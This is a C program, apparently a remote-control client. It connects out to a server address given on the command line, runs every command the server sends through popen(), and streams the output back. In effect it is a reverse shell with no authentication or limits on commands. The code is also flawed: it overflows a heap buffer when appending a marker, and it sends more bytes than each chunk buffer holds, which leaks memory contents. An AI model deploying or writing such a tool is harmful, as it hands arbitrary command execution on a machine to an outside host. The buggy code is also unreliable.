#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define MAX 15000

int main(int argc, char *argv[])
{
	struct addrinfo hints, *res;
	int status;
	char inbuff[MAX];

	if (argc < 3)
	{
		printf("Usage: ./client <ip> <port>\nExample: ./client 127.0.0.1 3000\n");
		return 1;
	}

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET; // AF_INET or AF_INET6 to force version
	hints.ai_socktype = SOCK_STREAM;

	if ((status = getaddrinfo(argv[1], argv[2], &hints, &res)) != 0)
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
		return 2;
	}

	int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1)
	{
		perror("connect");
		return 3;
	}
	
	int flag = 0;
    	while (1)
	{
	    	char *ack = "0";
		memset(inbuff, 0, MAX);
		recv(sockfd, inbuff, MAX, 0);
		flag += 1;
		
		printf("Server command: %s\n", inbuff);

		if (strcmp(inbuff, "exit") == 0)
		{
			printf("Exiting...\n");
			break;
		}
		        
	    	FILE *fp;
		char path[1035];

		// char buff[1035];
		char *outbuff = NULL; // Pointer for dynamically allocated memory

		// char *b = buff;
		size_t b_size = 1035;

		size_t outbuff_size = 0; // Size of dynamically allocated memory

		// Initialize outbuff with an empty string
		outbuff = malloc(1);
		outbuff[0] = '\0';
		
		fp = popen(inbuff, "r");
		
		if (fp == NULL) 
		{
			perror("popen");
		    	printf("Error executing command; Failed to run command\n***");
		    	pclose(fp);
	    	} else 
	    	{
	    		
    			while (1) 
    			{
				if(fgets(path, sizeof(path), fp) != NULL)
				{
					size_t path_len = strlen(path);
					
					// Reallocate memory for outbuff to accommodate the new string
					outbuff = realloc(outbuff, outbuff_size + path_len + 1); // +1 for null terminator
					
					if (outbuff == NULL) 
					{
						printf("Memory allocation failed\n***");
						exit(1);
					}
					
					// Concatenate the new string to outbuff
					memcpy(outbuff + outbuff_size, path, path_len);
					outbuff_size += path_len;
					outbuff[outbuff_size] = '\0'; // Null terminate the concatenated string
				} else
				{
					break;
				}
				
			}
			
			pclose(fp);
			
			strcat(outbuff, "***");
			outbuff_size += 3;

			// Divide outbuff into 15,000-character chunks and append "" to each chunk
			size_t total_chunks = outbuff_size / MAX + 1;

			size_t remaining_chars = outbuff_size;
			for (size_t i = 0; i < total_chunks; ++i) 
			{
			    
				// Calculate the length of the current chunk
				size_t chunk_len = (remaining_chars < MAX) ? remaining_chars : MAX;

				// Create a buffer for the current chunk
				char *chunk_buff = malloc(chunk_len + 1); // +1 for "\0"
				
				if (chunk_buff == NULL) 
				{
					printf("Memory allocation failed\n");
					exit(1);
				}

				// Copy the current chunk from outbuff
				memcpy(chunk_buff, outbuff + (i * MAX), chunk_len);

				// Append "" to the current chunk
				strcpy(chunk_buff + chunk_len, "");

				// Send the the current chunk
				send(sockfd, chunk_buff, MAX, 0);
				
				usleep(200000);

				// Free the memory allocated for the current chunk
				free(chunk_buff);

				// Update the remaining characters
				remaining_chars -= chunk_len;
			}  		    
			    
			// Free dynamically allocated memory
			free(outbuff);
		}        
    	}

	close(sockfd);
	return 0;
}

